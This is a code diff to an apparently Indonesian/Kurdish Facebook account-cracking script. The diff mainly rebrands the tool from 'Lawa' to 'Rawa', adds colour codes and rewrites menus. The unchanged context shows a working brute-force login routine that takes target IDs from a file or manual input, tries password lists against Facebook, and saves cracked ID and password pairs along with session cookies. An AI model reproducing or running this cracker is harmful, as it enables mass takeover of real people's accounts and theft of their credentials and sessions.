@@ -790,6 +790,29 @@ u = '\033[95m'  # UNGU
 kk = '\033[33m'  # KUNING -
 b = '\33[1;96m'  # BIRU -
 p = '\x1b[0;34m'  # BIRU +
+a1 = '\x1b[1;31m'  # سور
+a2 = '\x1b[1;34m'  # شین
+a3 = '\x1b[1;32m'  # سەوز
+a4 = '\x1b[1;33m'  # زەرد
+a5 = '\x1b[38;5;208m'  # پرتەقاڵی
+a6 = '\x1b[38;5;5m'  # مۆر
+a7 = '\x1b[38;5;13m'  # پەمەیی
+a8 = '\x1b[1;30m'  # ڕەش
+a9 = '\x1b[1;37m'  # سپی
+a10 = '\x1b[38;5;52m'  # قاوەیی
+a11 = '\x1b[38;5;8m'  # خۆڵەمێشی
+a12 = '\x1b[38;5;220m'  # زێڕین
+a13 = '\x1b[38;5;7m'  # زیوی
+a14 = '\x1b[38;5;153m'  # شینی کاڵ
+a15 = '\x1b[38;5;18m'  # شینی تۆخ
+a16 = '\x1b[38;5;48m'  # سەوزی کاڵ
+a17 = '\x1b[38;5;22m'  # سەوزی تووخ
+a18 = '\x1b[38;5;196m'  # سوری کاڵ
+a19 = '\x1b[38;5;88m'  # سوری توخ
+a20 = '\x1b[38;5;226m'  # زەردی کاڵ
+a21 = '\x1b[38;5;136m'  # زەردی توخ
+a22 = '\x1b[38;5;216m'  # پرتەقاڵی کاڵ
+a23 = '\x1b[38;5;166m'  # پرتەقاڵێ توچ
 # Warna
 H = ('\x1b[1;90m')
 M = ('\x1b[1;91m')
@@ -844,28 +867,14 @@ def baz_bann(berjalan):
 ###----------[ BANNER MENUH ]----------###
 def banner():
 	os.system('clear')
-	baz_bann(f'''{asu}
-
-██╗      █████╗ ██╗    ██╗ █████╗ 
-██║     ██╔══██╗██║    ██║██╔══██╗
-██║     ███████║██║ █╗ ██║███████║
-██║     ██╔══██║██║███╗██║██╔══██║
-███████╗██║  ██║╚███╔███╔╝██║  ██║
-╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝
-                                  
-                                                                       
-
-                  
-                  
-\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-\33[1;36m TOOL CREATE BY➢  Lawa
-\33[1;34m CHENEL➢ NO
-\33[1;36m TELGRAM➢ & @lawa_512
-\33[1;34m VERSION➢2.0🔆
-\33[1;32m LAWA is the father of Telegram
-\33[1;34m MR LAWA CRACKING
-\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-     
+	baz_bann(f'''\x1b[1;32m
+                                     
+,------.         ,--.   ,--.         
+|  .--. ' ,--,--.|  |   |  | ,--,--. 
+|  '--'.'' ,-.  ||  |.'.|  |' ,-.  | 
+|  |\  \ \ '-'  ||   ,'.   |\ '-'  | 
+`--' '--' `--`--''--'   '--' `--`--' 
+                                     
 ''')
 
 #kukis
@@ -895,7 +904,7 @@ def login_lagi334():
 		
 		asu = random.choice([m,k,h,b,u])
 		os.system('clear')
-		cookie=input(f'  [{h}•{x}] Enter Your Cookies :{asu} ')
+		cookie=input(f'  [{h}•{x}] Cookis bnusa :{asu} ')
 		open(".cok.txt", "w").write(cookie)
 		with requests.Session() as rsn:
 			try:
@@ -958,10 +967,10 @@ def menu(my_name, my_id):
         login_lagi334()
     os.system('clear')
     banner()
-    print(f'\x1b[1;96m  [ 1 ] CRACK BA FILE (LAWA)')
-    print(f'\x1b[1;34m  [ 2 ] CRACK BA ID (LAWA)')
-    print(f'\x1b[1;92m  [ 3 ] Log out cookie (LAWA)')
-    _____Dwi__Yantti_____ = input(f'\n└── HALBZHERA: ')
+    print(f'\x1b[38;5;8m  [ 1 ] CRACJ FILE [BEST]')
+    print(f'\x1b[38;5;8m  [ 2 ] CRACK ID PUBLIC [BEST]')
+    print(f'\x1b[38;5;8m  [ 3 ]  REMOVE COOKIS🗑️')
+    _____Dwi__Yantti_____ = input(f'\n HALBZHERA: ')
     if _____Dwi__Yantti_____ in ['2']:
         nge_krek()
     if _____Dwi__Yantti_____ in ['1']:
@@ -984,7 +993,7 @@ def nge_krek():
         print(f'{m}cookies telah kadaluarsa ster')
         exit()
     try:
-        dwi = int(input(f"\x1b[1;92m└──C CHAN ID DAWE ?:  "))
+        dwi = int(input(f"\x1b[1;32m CHAN ID DAWE ?:  "))
     except ValueError:
         exit()
     if dwi < 1 or dwi > 1000:
@@ -993,7 +1002,7 @@ def nge_krek():
     _dwi_ = 0
     for yantti in range(dwi):
         _dwi_ += 1
-        Masukan = input(f"\x1b[1;92m└── ID DANE {_dwi_}: ")
+        Masukan = input(f"\x1b[1;33m ID DANE {_dwi_}: ")
         uid.append(Masukan)
     for user in uid:
         try:
@@ -1041,22 +1050,22 @@ def nge_krek():
 ###----------[File]----------###
 def File2():
 			print('')
-			print('\x1b[1;92m             FILE CLONING')
+			print('\x1b[38;5;7m            FILE CLONING')
 			try:
-				print('        - - - - - - - - - - - -')
-				fileX = input ('\x1b[1;93m[+] ENTER FILE PATH :\x1b[1;96m ') 
+				#print('        - - - - - - - - - - - -')
+				fileX = input ('\x1b[38;5;18m[📁] ENTER FILE PATH :\x1b[38;5;18m ') 
 				for line in open(fileX, 'r').readlines():
 					id.append(line.strip())
 				print('')
-				print('\x1b[1;93mTOTAL ID :\x1b[1;91m '+str(len(id)))
+				print('\x1b[38;5;48mTOTAL ID :\x1b[38;5;22m '+str(len(id)))
 				atur_dulu()
 			except IOError:
 				exit("\x1b[1;91m[!] FILE  %s NOT FOUND"%(fileX))
 ###----------[ ATUR SBLUM KREK ]----------###
 def atur_dulu():
-	print("\x1b[1;96m× 3 ×RANDOM -FACEBOOK")
-	aturid = input(f'\x1b[1;92m└──C HALBZHERA : ')
-	print(f'\x1b[1;92m╭────────────────────')
+	print("\x1b[38;5;8m[ 3 ] CRACK FACEBOOK RANDOM")
+	aturid = input(f'\x1b[38;5;8m HALBZHERA : ')
+	print(f'\x1b[1;92m_____________________________')
 	if aturid in ['1','01']:
 		for akunlama in sorted(id):
 			id2.append(akunlama)
@@ -1080,10 +1089,10 @@ def atur_dulu():
 		exit()
 		
 
-	print("\x1b[1;93m× Method Mobile Good")
-	metod = input(f'└── ZHMARA 1 DANE : ')
-	print(f'╭──────────────────────────────────────')
-	print(f'└── {h}STARTING CRACK (Lawa)')
+	print("\x1b[38;5;8mMETHOD MOBILE \x1b[38;5;48m[GOOD]")
+	metod = input(f'HALBZHERA👍🏽 : ')
+	#print(f'╭──────────────────────────────────────')
+	#print(f'└── {h}STARTING CRACK (Lawa)')
 	if metod in ['1','01']:
 		baz.append('metod1')
 	else:
@@ -1159,8 +1168,8 @@ def passwrd():
 			else:
 				gas_krek.submit(metod1,idf,pwv)
 	print(f'{xxx}')
-	print(f'{hijo}+ {puti}Akun LIVE  : {hijo}%s{xxx} '%(ok))
-	print(f'{kun}+ {puti}Akun CHEK  : {kun}%s{xxx} '%(cp))
+	print(f'{hijo}+ {puti}ALL LIVE  : {hijo}%s{xxx} '%(ok))
+	print(f'{kun}+ {puti}ALL CHEK  : {kun}%s{xxx} '%(cp))
 	print(f'{xxx}')
 		
 ###----------[ METODE ]----------###
@@ -1169,7 +1178,7 @@ rescp = []
 def metod1(idf,pwv,awal):
 	global loop,ok,cp
 	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
-	sys.stdout.write(f" Lawa√ [{kun} {(loop)}{puti}/{hijo}{len(id)}{puti} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ] \r");sys.stdout.flush()
+	sys.stdout.write(f"\x1b[38;5;220m[RAWA] [{a10} {(loop)}{a9}/{a1}{len(id)}{a2} ] [ {a11}{(ok)}{a16}/{a15}{(cp)}{a20} ] \r");sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1211,21 +1220,21 @@ def metod1(idf,pwv,awal):
 			if "checkpoint" in po.cookies.get_dict():
 				
 				cp+=1
-				open('CHEK/'+cph,'a').write(f'{idf}|{pw}\n') 
+				#open('CHEK/'+cph,'a').write(f'{idf}|{pw}\n') 
 				tree = Tree("                                 ")
-				tree.add(f"\r{kun}{idf} {pw}{xxx}")
-				tree.add(f"\r{mer}{ua}")
+				#tree.add(f"\r{kun}{idf} {pw}{xxx}")
+				#tree.add(f"\r{mer}{ua}")
 				prints(tree)
 				break
 			elif "c_user" in ses.cookies.get_dict():
 				kuki = convert(ses.cookies.get_dict())
 				ok+=1
 				open('LIVE/'+okh,'a').write(f'{idf}|{pw}\n') 
-				tree = Tree("   GASHTYAR OK     ")
-				tree.add(f"⌲ ID : {hijo}{idf}{puti}")
-				tree.add(f"⌲ PASS: {hijo}{pw}{puti}")
-				tree.add(f"⌲ YEAR: {mer}{tahun(idf)}{puti}")
-				tree.add(f"⌲ KUKI: {hijo}{kuki}{puti}")
+				tree = Tree("   RaWa ok💀     ")
+				tree.add(f"⌲ ID : {a10}{idf}{a18}")
+				tree.add(f"⌲ PASS: {a2}{pw}{a5}")
+				#tree.add(f"⌲ YEAR: {mer}{tahun(idf)}{puti}")
+				tree.add(f"⌲ KUKI: {a6}{kuki}{a6}")
 			###	tree.add(f"⌲ {hijo}{ua}")
 				prints(tree)
 				break
